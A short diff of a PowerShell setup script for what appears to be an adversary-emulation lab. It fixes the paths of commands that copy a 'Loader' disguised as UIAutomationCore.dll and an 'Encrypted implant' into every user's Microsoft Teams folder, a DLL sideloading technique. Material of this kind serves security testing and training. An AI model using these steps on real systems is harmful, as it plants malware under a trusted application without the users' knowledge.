@@ -16,6 +16,6 @@ while($true) {
 }
 
 # Transfer files into install dir
-Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\LunarUI.bin" $_"\AppData\Local\Microsoft\Teams\current\UIAutomationCore.dll" } # Loader
-Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\ffmpeg.dat" $_"\AppData\Local\Microsoft\Teams\current\ffmpeg.dat" }            # Encrypted implant
+Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\LunarUI.bin" C:\Users\$_"\AppData\Local\Microsoft\Teams\current\UIAutomationCore.dll" } # Loader
+Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\ffmpeg.dat" C:\Users\$_"\AppData\Local\Microsoft\Teams\current\ffmpeg.dat" }            # Encrypted implant
 echo "Done!" > C:\Users\Public\Desktop\LAB_FILES\Installed.txt
